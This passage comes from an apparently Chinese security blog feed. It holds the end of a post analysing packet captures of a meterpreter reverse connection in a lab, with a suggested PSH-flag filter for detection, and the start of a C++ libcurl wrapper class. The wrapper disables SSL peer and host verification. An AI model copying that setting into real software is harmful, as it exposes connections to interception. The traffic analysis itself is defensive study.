00:50:38.997767 IP (tos 0x0, ttl 128, id 11402, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xb2bb (correct), seq 6967, ack 413827, win 256, length 0
00:50:39.048095 IP (tos 0x0, ttl 128, id 11403, offset 0, flags [DF], proto TCP (6), length 424)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x095d (correct), seq 6967:7351, ack 413827, win 256, length 384
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-25/0x02.png&quot; alt=&quot;收到数据&quot; /&gt;
经过被控端执行后，与控制端之间的握手传递数据包如上&lt;/p&gt;

&lt;h2 id=&quot;0x03-分析过程&quot;&gt;0x03 分析过程&lt;/h2&gt;

&lt;p&gt;首先我们找到握手包，也就是&lt;code class=&quot;highlighter-rouge&quot;&gt;SYN&lt;/code&gt;为1的包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00:50:37.894897 IP (tos 0x0, ttl 128, id 11369, offset 0, flags [DF], proto TCP (6), length 52)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [S], cksum 0x8459 (correct), seq 3700655894, win 8192, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flags在tcpdump工具中的表现形式是有效标志位会在&lt;code class=&quot;highlighter-rouge&quot;&gt;[]&lt;/code&gt;中手写字母&lt;/p&gt;

&lt;p&gt;也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;Flags [S]&lt;/code&gt;，在Wireshark中是&lt;code class=&quot;highlighter-rouge&quot;&gt;Set&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;再往下找具有可疑特征的地方：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[1]00:50:37.928066 IP (tos 0x0, ttl 128, id 11378, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x77c8 (correct), seq 0, ack 173745, win 256, length 0
[2]00:50:37.928178 IP (tos 0x0, ttl 128, id 11379, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x6231 (correct), seq 0, ack 179272, win 256, length 0
[3]00:50:38.323103 IP (tos 0x0, ttl 128, id 11380, offset 0, flags [DF], proto TCP (6), length 463)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x3b8d (correct), seq 0:423, ack 179843, win 254, length 423
[4]00:50:38.375995 IP (tos 0x0, ttl 128, id 11381, offset 0, flags [DF], proto TCP (6), length 232)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0xbf82 (correct), seq 423:615, ack 179971, win 253, length 192
[5]00:50:38.441008 IP (tos 0x0, ttl 128, id 11382, offset 0, flags [DF], proto TCP (6), length 200)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x76a7 (correct), seq 615:775, ack 180115, win 253, length 160
[6]00:50:38.589346 IP (tos 0x0, ttl 128, id 11383, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xdc3c (correct), seq 775, ack 212883, win 162, length 0
[7]00:50:38.589354 IP (tos 0x0, ttl 128, id 11384, offset 0, flags [DF], proto TCP (6), length 40)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为了方便查看，我把每个包都进行了编号，从&lt;code class=&quot;highlighter-rouge&quot;&gt;1-7&lt;/code&gt;来看，&lt;code class=&quot;highlighter-rouge&quot;&gt;[1]&lt;/code&gt;到&lt;code class=&quot;highlighter-rouge&quot;&gt;[2]&lt;/code&gt;是比较正常的数据包，而到了&lt;code class=&quot;highlighter-rouge&quot;&gt;[3]&lt;/code&gt;至&lt;code class=&quot;highlighter-rouge&quot;&gt;[5]&lt;/code&gt;则出现了特征，数据包的标志位&lt;code class=&quot;highlighter-rouge&quot;&gt;PSH&lt;/code&gt;设置为了&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;，并且数据包大小逐渐增大，也就是&lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt;长度，从40增长至463，再到200，最后恢复40。&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Flags：从左到右，**[URG&lt;/td&gt;
      &lt;td&gt;ACK&lt;/td&gt;
      &lt;td&gt;PSH&lt;/td&gt;
      &lt;td&gt;RST&lt;/td&gt;
      &lt;td&gt;SYN&lt;/td&gt;
      &lt;td&gt;FIN]**&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ACK设置为1表示前面的确认（ack）是有效的，否则前面的确认应被忽略。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PSH表示要求对方在接到数据后立即请求递交给应用程序，而不是缓冲起来直到缓冲区收满为止。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;RST用于重置一个已经混乱的连接。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SYN用于建立连接的过程。在链接请求中，SYN=1和ACK=0表示该数据段没有使用捎带的确认域。链接应答则捎带了一个确认，即SYN=1和ACK=1.本质上SYN位是用来表示CONNECTION
REQUEST和CONNECTION ACCEPTED，然后进一步用ACK来区分是请求还是应答，的确很高明。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;FIN用来释放一个连接。它表示发送方已经没有数据要传输了。然后，在关闭一个连接后，关闭进程可能会在一段不确定的时间内继续接收到数据。SYN和FIN数据段都有TCP序号，从而保证了这两种数据段被按照正确的顺序来进行处理。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;窗口大小：指定了从被确认的字节算起可以发送多少个字节。要深入理解这个域的含义，可以参看TCP用色控制和慢启动算法&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;校验和：校验范围包括TCP头、数据报内容和概念性伪头部。概念性伪头部又包括源IP，目的IP，TCP协议号。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;紧急指针：指向数据报中紧急数据最后一个字节的下一个字节。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;从木马行为来看，连接成功后，会传输一段比较大的数据，而这个数据包的标志位&lt;code class=&quot;highlighter-rouge&quot;&gt;PSH&lt;/code&gt;必须为&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;由此我们可以通过拦截网络中&lt;code class=&quot;highlighter-rouge&quot;&gt;PSH&lt;/code&gt;为&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;的数据包来阻断木马的传输，当然 可能会对使用其他协议的应用程序造成影响，但是它的效果却是理想的，查杀木马之前必然需要做快速发现、快速隔离、快速报警的动作，而&lt;code class=&quot;highlighter-rouge&quot;&gt;PSH&lt;/code&gt;为&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;的应用程序很少，这使得木马更容易被防火墙发现。&lt;/p&gt;

&lt;h2 id=&quot;0x04-wireshark-分析&quot;&gt;0x04 Wireshark 分析&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo tcpdump -i vnic0 -vv dst 10.211.55.2 and port 8877 -w msf.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将接受到的数据包保存为文件，直接可以打开Wireshark分析~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-25/0x03.png&quot; alt=&quot;Wireshark分析&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到，的确有几个数据包的PSH为1。&lt;/p&gt;

&lt;h2 id=&quot;0x05-其他的一些思考&quot;&gt;0x05 其他的一些思考&lt;/h2&gt;

&lt;p&gt;测试了一些meterpreter命令：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;getuid&lt;/li&gt;
  &lt;li&gt;ifconfig&lt;/li&gt;
  &lt;li&gt;sysinfo&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;均带有PSH标志位&lt;/p&gt;

&lt;p&gt;在不影响业务、系统的正常使用情况下，可以采用过滤PSH数据包的办法来降低木马带来的风险。&lt;/p&gt;

</description>
        <pubDate>Thu, 25 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-01-25/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-01-25/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>封装好的CURL class 尽情享用</title>
        <description>&lt;p&gt;本篇文章主要是记录一下使用CURL的坑
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-类的定义&quot;&gt;0x01 类的定义&lt;/h2&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 设置请求地址以及端口&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 设置请求地址&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 设置端口&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// get 方法&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;postRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// post 方法&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addRequestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 添加请求头&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getTitle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取标题&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取响应内容&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 根据指定的键名获取键值 例子：getResponse(&quot;Server&quot;); // BWS/1.1&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 释放资源&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 响应码&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 超时时间&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_connectTimeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 连接超时时间&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 核心请求方法&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// curl指针&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CURLcode&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 请求返回值&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 请求地址&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 请求端口&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 响应标题&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 响应头&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 响应主体内容&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isRequested&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 是否请求完毕&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_slist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 请求头列表 headers &lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_slist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseCookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 响应Cookie&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_callBackWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 回调函数，用于将响应内容放入内存操作&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x02-主要请求方法的实现&quot;&gt;0x02 主要请求方法的实现&lt;/h2&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
 * 发送请求
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_CONNECTTIMEOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_connectTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_SSL_VERIFYPEER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_SSL_VERIFYHOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_WRITEFUNCTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_callBackWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_WRITEHEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_WRITEDATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_HTTPHEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
